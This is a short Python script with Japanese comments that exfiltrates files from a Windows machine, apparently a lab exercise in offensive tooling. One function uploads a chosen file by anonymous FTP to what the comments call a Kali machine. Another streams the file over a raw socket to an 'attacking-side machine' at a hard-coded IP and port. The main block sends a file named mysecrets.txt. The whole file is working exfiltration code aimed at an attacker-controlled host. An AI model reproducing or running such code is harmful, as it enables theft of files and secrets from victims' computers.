#ファイル転送による送信

import ftplib
import os
import socket
import win32file


#FTPサーバーを有効化。kaliのIPを指定
def plain_ftp(docpath, server='192.168.1.203'):
    ftp = ftplib.FTP(server)
    #サーバーへの接続とログイン
    ftp.login("anonymous", "anon@example.com")
    #kaliのファイルのアップロード先へ移動
    ftp.cwd('/pub/')
    #ディレクトリにファイルを保存
    ftp.storbinary("STOR " + os.path.basename(docpath),
                   open(docpath, "rb"), 1024)
    ftp.quit()


#転送したいファイルへのパスを引数として渡す
def transmit(document_path):
    #攻撃側マシンへの接続
    client = socket.socket()
    client.connect(('192.168.1.207', 10000))
    with open(document_path, 'rb') as f:
        #ファイルを転送
        win32file.TransmitFile(
            client,
            win32file._get_osfhandle(f.fileno()),
            0, 0, None, 0, b'', b'')


if __name__ == '__main__':
    transmit('./mysecrets.txt')